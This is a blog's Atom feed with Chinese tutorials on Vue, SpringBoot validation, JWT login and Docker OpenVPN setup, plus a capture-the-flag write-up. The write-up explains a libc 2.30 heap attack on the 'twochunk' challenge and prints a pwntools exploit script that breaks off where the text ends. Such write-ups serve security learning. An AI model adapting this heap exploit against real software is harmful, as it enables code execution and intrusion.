<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>咲夜南梦&#39;s 博客</title>
  <icon>https://www.gravatar.com/avatar/9c2e3cbf266e9f01ba2f5ba134dc3429</icon>
  <subtitle>技术向-肥宅空间</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-22T04:28:04.648Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>咲夜南梦</name>
    <email>196011564@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vue-入门</title>
    <link href="http://yoursite.com/2020/03/22/Vue-%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2020/03/22/Vue-%E5%85%A5%E9%97%A8/</id>
    <published>2020-03-22T03:18:02.000Z</published>
    <updated>2020-03-22T04:28:04.648Z</updated>
    
    <content type="html"><![CDATA[<h1>Vue-入门</h1><h2 id="注意以下代码都是compiler版本的代码，如果是runtime版本的话在main-js程序入口会有一些区别，区别如下。">注意以下代码都是compiler版本的代码，如果是runtime版本的话在main.js程序入口会有一些区别，区别如下。</h2><h3 id="comiler版本">comiler版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">  el: &quot;#app&quot;,</span><br><span class="line">  component:&#123;</span><br><span class="line">    App</span><br><span class="line">  &#125;,</span><br><span class="line">  render: h&#x3D;&gt;h(App),</span><br><span class="line">  router</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="runtime版本">runtime版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const app &#x3D; new Vue(&#123;</span><br><span class="line">  router</span><br><span class="line">&#125;).$mount(&#39;#app&#39;)</span><br></pre></td></tr></table></figure><h2 id="一、通过WebStorm创建Vue项目">一、通过WebStorm创建Vue项目</h2><h3 id="创建WebStorm的Vue项目一般默认是compiler版本，请注意程序入口的编写。然后我额外添加了auth目录（看您需求），大致目录如下">创建WebStorm的Vue项目一般默认是compiler版本，请注意程序入口的编写。然后我额外添加了auth目录（看您需求），大致目录如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── README.md</span><br><span class="line">├── babel.config.js</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">├── public</span><br><span class="line">│   ├── favicon.ico</span><br><span class="line">│   └── index.html</span><br><span class="line">├── src</span><br><span class="line">│   ├── app</span><br><span class="line">│   │   └── App.vue</span><br><span class="line">│   ├── assets</span><br><span class="line">│   │   └── logo.png</span><br><span class="line">│   ├── components</span><br><span class="line">│   │   └── auth</span><br><span class="line">│   │       ├── login</span><br><span class="line">│   │       │   └── LoginForm.vue</span><br><span class="line">│   ├── main.js</span><br><span class="line">│   └── router</span><br><span class="line">│       └── main.js</span><br></pre></td></tr></table></figure><h3 id="src目录下的main-js就是程序入口">src目录下的main.js就是程序入口</h3><h3 id="components目录一般存放各种template">components目录一般存放各种template</h3><h3 id="app目录一般存放最开始生成的App-vue">app目录一般存放最开始生成的App.vue</h3><h3 id="router目录下一般放一个router-js用于返回路由列表信息">router目录下一般放一个router.js用于返回路由列表信息</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Vue-入门&lt;/h1&gt;
&lt;h2 id=&quot;注意以下代码都是compiler版本的代码，如果是runtime版本的话在main-js程序入口会有一些区别，区别如下。&quot;&gt;注意以下代码都是compiler版本的代码，如果是runtime版本的话在main.js程序入口会有一些区别
      
    
    </summary>
    
    
      <category term="Vue" scheme="http://yoursite.com/categories/Vue/"/>
    
    
      <category term="Vue" scheme="http://yoursite.com/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot_Valid注解</title>
    <link href="http://yoursite.com/2020/03/21/SpringBoot_Valid%E6%B3%A8%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/21/SpringBoot_Valid%E6%B3%A8%E8%A7%A3/</id>
    <published>2020-03-21T10:27:02.000Z</published>
    <updated>2020-03-21T18:49:51.505Z</updated>
    
    <content type="html"><![CDATA[<h1>SpringBoot_Valid注解</h1><h3 id="在后端经常会遇到检测参数是否正常的需求，所以整理一下Valid注解">在后端经常会遇到检测参数是否正常的需求，所以整理一下Valid注解</h3><h3 id="1、mvn加载valid库">1、mvn加载valid库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.hibernate.validator&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hibernate-validator&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;6.0.13.Final&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="2、各个注解的解释">2、各个注解的解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">@Valid 注解类型的使用:</span><br><span class="line"></span><br><span class="line">@Null</span><br><span class="line">限制只能为null</span><br><span class="line"></span><br><span class="line">@NotNull</span><br><span class="line">限制必须不为null</span><br><span class="line"></span><br><span class="line">@AssertFalse</span><br><span class="line">限制必须为false</span><br><span class="line"></span><br><span class="line">@AssertTrue</span><br><span class="line">限制必须为true</span><br><span class="line"></span><br><span class="line">@DecimalMax(value)</span><br><span class="line">限制必须为一个不大于指定值的数字</span><br><span class="line"></span><br><span class="line">@DecimalMin(value)</span><br><span class="line">限制必须为一个不小于指定值的数字</span><br><span class="line"></span><br><span class="line">@Digits(integer,fraction)</span><br><span class="line">限制必须为一个小数，且整数部分的位数不能超过integer，小数部分的位数不能超过fraction</span><br><span class="line"></span><br><span class="line">@Future</span><br><span class="line">限制必须是一个将来的日期</span><br><span class="line"></span><br><span class="line">@Max(value)</span><br><span class="line">限制必须为一个不大于指定值的数字</span><br><span class="line"></span><br><span class="line">@Min(value)</span><br><span class="line">限制必须为一个不小于指定值的数字</span><br><span class="line"></span><br><span class="line">@Past</span><br><span class="line">限制必须是一个过去的日期</span><br><span class="line"></span><br><span class="line">@Pattern(value)</span><br><span class="line">限制必须符合指定的正则表达式</span><br><span class="line"></span><br><span class="line">@Size(max,min)</span><br><span class="line">限制字符长度必须在min到max之间</span><br><span class="line"></span><br><span class="line">@Past</span><br><span class="line">验证注解的元素值（日期类型）比当前时间早</span><br><span class="line"></span><br><span class="line">@NotEmpty</span><br><span class="line">验证注解的元素值不为null且不为空（字符串长度不为0、集合大小不为0）</span><br><span class="line"></span><br><span class="line">@NotBlank</span><br><span class="line">验证注解的元素值不为空（不为null、去除首位空格后长度为0），不同于@NotEmpty，@NotBlank只应用于字符串且在比较时会去除字符串的空格</span><br><span class="line"></span><br><span class="line">@Email</span><br><span class="line">验证注解的元素值是Email，也可以通过正则表达式和flag指定自定义的email格式</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;SpringBoot_Valid注解&lt;/h1&gt;
&lt;h3 id=&quot;在后端经常会遇到检测参数是否正常的需求，所以整理一下Valid注解&quot;&gt;在后端经常会遇到检测参数是否正常的需求，所以整理一下Valid注解&lt;/h3&gt;
&lt;h3 id=&quot;1、mvn加载valid库&quot;&gt;1、mvn加载
      
    
    </summary>
    
    
      <category term="SpringBoot" scheme="http://yoursite.com/categories/SpringBoot/"/>
    
    
      <category term="SpringBoot" scheme="http://yoursite.com/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot_Vue实现token登录</title>
    <link href="http://yoursite.com/2020/03/21/SpringBoot_Vue%E5%AE%9E%E7%8E%B0token%E7%99%BB%E5%BD%95/"/>
    <id>http://yoursite.com/2020/03/21/SpringBoot_Vue%E5%AE%9E%E7%8E%B0token%E7%99%BB%E5%BD%95/</id>
    <published>2020-03-21T07:18:02.000Z</published>
    <updated>2020-03-21T18:51:24.716Z</updated>
    
    <content type="html"><![CDATA[<h1>Springboot_Vue实现token登录</h1><h2 id="前言">前言</h2><h3 id="最近的项目需要用到Springboot-Vue来实现token登录的效果，所以就顺手一边整理一边学习了。">最近的项目需要用到Springboot+Vue来实现token登录的效果，所以就顺手一边整理一边学习了。</h3><hr><h3 id="1、添加依赖包">1、添加依赖包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;io.jsonwebtoken&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jjwt&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.6.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="2、创建一个JwtUtils类">2、创建一个JwtUtils类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、使用JwtBuilder来创建token，实现加解密">3、使用JwtBuilder来创建token，实现加解密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Springboot_Vue实现token登录&lt;/h1&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;h3 id=&quot;最近的项目需要用到Springboot-Vue来实现token登录的效果，所以就顺手一边整理一边学习了。&quot;&gt;最近的项目需要用到Springboot+Vue来实
      
    
    </summary>
    
    
      <category term="Spring" scheme="http://yoursite.com/categories/Spring/"/>
    
    
      <category term="Spring" scheme="http://yoursite.com/tags/Spring/"/>
    
      <category term="Vue.js" scheme="http://yoursite.com/tags/Vue-js/"/>
    
  </entry>
  
  <entry>
    <title>Docker-OpenVPN镜像配置</title>
    <link href="http://yoursite.com/2020/03/19/Docker-OpenVPN%E9%95%9C%E5%83%8F%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2020/03/19/Docker-OpenVPN%E9%95%9C%E5%83%8F%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-19T09:05:02.000Z</published>
    <updated>2020-03-20T16:31:46.877Z</updated>
    
    <content type="html"><![CDATA[<h1>Docker-OpenVPN镜像配置</h1><h2 id="项目中需要用到OpenVPN来接入到环境中">项目中需要用到OpenVPN来接入到环境中</h2><h2 id="为了方便起见，所以采用了Docker">为了方便起见，所以采用了Docker</h2><hr><h2 id="前言">前言</h2><h3 id="kylemanna-openvpn这个镜像将大部分的一键化自动脚本进行整合，通过docker-run一步一步进行配置">kylemanna/openvpn这个镜像将大部分的一键化自动脚本进行整合，通过docker run一步一步进行配置</h3><h3 id="最后启动service就好了">最后启动service就好了</h3><h3 id="首先拖取镜像-kylemanna-openvpn">首先拖取镜像 kylemanna/openvpn</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull kylemanna&#x2F;openvpn</span><br></pre></td></tr></table></figure><h3 id="启动容器并初始化">启动容器并初始化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v &#96;pwd&#96;&#x2F;data&#x2F;openvpn:&#x2F;etc&#x2F;openvpn --rm kylemanna&#x2F;openvpn ovpn_genconfig -u udp:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><h3 id="生成密钥文件">生成密钥文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v &#96;pwd&#96;&#x2F;data&#x2F;openvpn:&#x2F;etc&#x2F;openvpn --rm -it kylemanna&#x2F;openvpn ovpn_initpki</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入私钥密码（输入时是看不见的）：</span><br><span class="line">Enter PEM pass phrase:12345678</span><br><span class="line">再输入一遍</span><br><span class="line">Verifying - Enter PEM pass phrase:12345678</span><br><span class="line">输入一个CA名称（我这里直接回车）</span><br><span class="line">Common Name (eg: your user, host, or server name) [Easy-RSA CA]:</span><br><span class="line">输入刚才设置的私钥密码（输入完成后会再让输入一次）</span><br><span class="line">Enter pass phrase for &#x2F;etc&#x2F;openvpn&#x2F;pki&#x2F;private&#x2F;ca.key:12345678</span><br></pre></td></tr></table></figure><h3 id="生成客户端无密码证书">生成客户端无密码证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v &#96;pwd&#96;&#x2F;data&#x2F;openvpn:&#x2F;etc&#x2F;openvpn --rm -it kylemanna&#x2F;openvpn easyrsa build-client-full $openvpn_client nopass</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入刚才设置的密码</span><br><span class="line">Enter pass phrase for &#x2F;etc&#x2F;openvpn&#x2F;pki&#x2F;private&#x2F;ca.key:12345678</span><br></pre></td></tr></table></figure><h3 id="导出客户端证书">导出客户端证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v &#96;pwd&#96;&#x2F;data&#x2F;openvpn:&#x2F;etc&#x2F;openvpn --rm kylemanna&#x2F;openvpn ovpn_getclient $openvpn_client &gt; .&#x2F;conf&#x2F;&quot;$openvpn_client&quot;.ovpn</span><br></pre></td></tr></table></figure><h3 id="开启OpenVPN服务">开启OpenVPN服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name openvpn -v &#96;pwd&#96;&#x2F;data&#x2F;openvpn:&#x2F;etc&#x2F;openvpn -d -p 1194:1194&#x2F;udp --cap-add&#x3D;NET_ADMIN kylemanna&#x2F;openvpn</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Docker-OpenVPN镜像配置&lt;/h1&gt;
&lt;h2 id=&quot;项目中需要用到OpenVPN来接入到环境中&quot;&gt;项目中需要用到OpenVPN来接入到环境中&lt;/h2&gt;
&lt;h2 id=&quot;为了方便起见，所以采用了Docker&quot;&gt;为了方便起见，所以采用了Docker&lt;/h2&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="Docker" scheme="http://yoursite.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CTF-XCTF公益赛-20年3月</title>
    <link href="http://yoursite.com/2020/03/19/CTF-XCTF%E5%85%AC%E7%9B%8A%E8%B5%9B-20%E5%B9%B43%E6%9C%88/"/>
    <id>http://yoursite.com/2020/03/19/CTF-XCTF%E5%85%AC%E7%9B%8A%E8%B5%9B-20%E5%B9%B43%E6%9C%88/</id>
    <published>2020-03-19T06:16:02.000Z</published>
    <updated>2020-03-19T08:05:37.769Z</updated>
    
    <content type="html"><![CDATA[<h5 id="这次比赛的质量比较高的，做了4个Pwn，发现自己还需要学很多东西">这次比赛的质量比较高的，做了4个Pwn，发现自己还需要学很多东西</h5><h1><strong>PWN：</strong></h1><h2 id="题目名称-题目状态-working-xxx">题目名称 | 题目状态 | working : xxx</h2><h2 id="twochunk-SLOVED-Solve-咲夜南梦">twochunk | SLOVED | Solve: 咲夜南梦</h2><h3 id="首先要审计libc2-30源码，发现在取出unsorted-bin中的一个chunk时，会将剩余的chunk放到tcache里，而且只对bk指针指向的内存地址的bk做了check，所以只需要在unsorted-bin里放3个连锁的bins，然后在tcache留四块对应的大小的堆块，然后把unsorted-bin最后一个堆块的bk改成0x23333000-0x10，然后在0x23333000-0x10所对应的bk位置写成0x23333000-0x10即可，另外libc它只check了是否存在0x7f，但是libc地址的开头也可以是0x7e，概率大概是五分之一左右。和我出的2020-BUUOJ-PWN红包题很像嗷。-´罒">首先要审计libc2.30源码，发现在取出unsorted bin中的一个chunk时，会将剩余的chunk放到tcache里，而且只对bk指针指向的内存地址的bk做了check，所以只需要在unsorted bin里放3个连锁的bins，然后在tcache留四块对应的大小的堆块，然后把unsorted bin最后一个堆块的bk改成0x23333000 - 0x10，然后在0x23333000 - 0x10所对应的bk位置写成0x23333000 - 0x10即可，另外libc它只check了是否存在0x7f，但是libc地址的开头也可以是0x7e，概率大概是五分之一左右。和我出的2020-BUUOJ-PWN红包题很像嗷。(<em>´罒`</em>)</h3><h3 id="附上Exp：">附上Exp：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Author xynm</span><br><span class="line">#import xynm_pwn_util</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from PwnContext import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;CRITICAL&#39;</span><br><span class="line">remote_ip        &#x3D; b&#39;121.36.209.145&#39;</span><br><span class="line">remote_port      &#x3D; 9999</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;twochunk_patch&quot;</span><br><span class="line">remote_libc_file &#x3D; &quot;libc.so.6&quot;</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False):</span><br><span class="line">    if awd:</span><br><span class="line">        context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">        ctx.binary &#x3D; &#39;.&#x2F;%s&#39; % &quot;twochunk&quot;</span><br><span class="line">        ctx.remote_libc &#x3D; &quot;libc.so.6&quot;</span><br><span class="line">        #ctx.remote_libc &#x3D;b&#39;&#x2F;tools&#x2F;libc-database-master&#x2F;db&#x2F;libc6_2.23-0ubuntu10_amd64.so&#39;</span><br><span class="line">        #ctx.remote_libc &#x3D;b&#39;&#x2F;tools&#x2F;libc&#x2F;libc-2.23_ubuntu16_x32.so&#39;</span><br><span class="line">    elf &#x3D; ctx.binary</span><br><span class="line">    if awd or remote:</span><br><span class="line">        lib &#x3D; ctx.remote_libc</span><br><span class="line">    else:</span><br><span class="line">        lib &#x3D; ctx.libc</span><br><span class="line">    def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">        gdb.attach(sh,gdb_script)</span><br><span class="line">    if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">        pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">        pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">    elif context.arch &#x3D;&#x3D; b&quot;i386&quot;:</span><br><span class="line">        pop_ebp_ret &#x3D; elf.search(asm(b&quot;pop ebp ; ret&quot;)).next()</span><br><span class="line">        pop3_ret    &#x3D; elf.search(asm(b&quot;pop esi ; pop edi ; pop ebp ; ret&quot;)).next()</span><br><span class="line">    s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">    sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">    sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">    sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">    r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">    ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">    irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">    uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">    uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">    ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">    ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">    lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">    def inputData(name,message):</span><br><span class="line">        sa(&quot;:&quot;,name)</span><br><span class="line">        sa(&quot;:&quot;,message)</span><br><span class="line">    def add(idx,size):</span><br><span class="line">        sla(&quot;choice:&quot;,&quot;1&quot;)</span><br><span class="line">        sla(&quot;idx&quot;,str(idx))</span><br><span class="line">        sla(&quot;size&quot;,str(size))</span><br><span class="line">    def free(idx):</span><br><span class="line">        sla(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">        sla(&quot;idx&quot;,str(idx))</span><br><span class="line">    def show(idx):</span><br><span class="line">        sla(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">        sla(&quot;idx&quot;,str(idx))</span><br><span class="line">    def edit(idx,content):</span><br><span class="line">        sla(&quot;choice:&quot;,&quot;4&quot;)</span><br><span class="line">        sla(&quot;idx:&quot;,str(idx))</span><br><span class="line">        sa(&quot;:&quot;,content)</span><br><span class="line">    def malloc_message(message):</span><br><span class="line">        sla(&quot;choice&quot;,&quot;6&quot;)</span><br><span class="line">        sa(&quot;:&quot;,message)</span><br><span class="line">    def showNameMessage():</span><br><span class="line">        sla(&quot;choice&quot;,&quot;5&quot;)</span><br><span class="line">    def call():</span><br><span class="line">        sla(&quot;choice&quot;,&quot;7&quot;)</span><br><span class="line">    inputData(p64(0x23333000 - 0x10) * 6,p64(0x23333000 - 0x10) * 8)</span><br><span class="line">    for i in range(3):</span><br><span class="line">        add(0,0x88)</span><br><span class="line">        free(0)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        add(0,0x108)</span><br><span class="line">        free(0)</span><br><span class="line">    for i in range(8):</span><br><span class="line">        add(0,0x88 + 8 + 0x110 + 0x8)</span><br><span class="line">        free(0)</span><br><span class="line">    add(0,0x88 + 8 + 0x110 + 0x8)</span><br><span class="line">    add(1,0x300)</span><br><span class="line">    free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x110)</span><br><span class="line">    free(0)</span><br><span class="line">    for i in range(8):</span><br><span class="line">        add(0,0x88 + 8 + 0x120 + 0x8)</span><br><span class="line">        free(0)</span><br><span class="line">    add(0,0x88 + 8 + 0x120 + 0x8)</span><br><span class="line">    add(1,0x300)</span><br><span class="line">    free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x120)</span><br><span class="line">    free(0)</span><br><span class="line">    add(1,0x300)</span><br><span class="line">    free(1)</span><br><span class="line">    for i in range(8):</span><br><span class="line">        add(0,0xF8 + 8 + 0x140 + 0x8)</span><br><span class="line">        free(0)</span><br><span class="line">    add(0,0xF8 + 8 + 0x140 + 0x8)</span><br><span class="line">    add(1,0x300)</span><br><span class="line">    free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x140)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x88 + 8 + 0x150 + 0x8)</span><br><span class="line">    for i in range(8):</span><br><span class="line">        add(1,0x88 + 8 + 0x150 + 0x8)</span><br><span class="line">        free(1)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x150)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,0x300)</span><br><span class="line">    free(0)</span><br><span class="line">    add(0,23333)</span><br><span class="line">    show(0)</span><br><span class="line">    __malloc_hook &#x3D; uu64(ru(&#39;\x00\x00&#39;)[-6:]) - 336 - 0x10</span><br><span class="line">    libc &#x3D; __malloc_hook - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">    system &#x3D; libc+lib.sym[&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; libc + 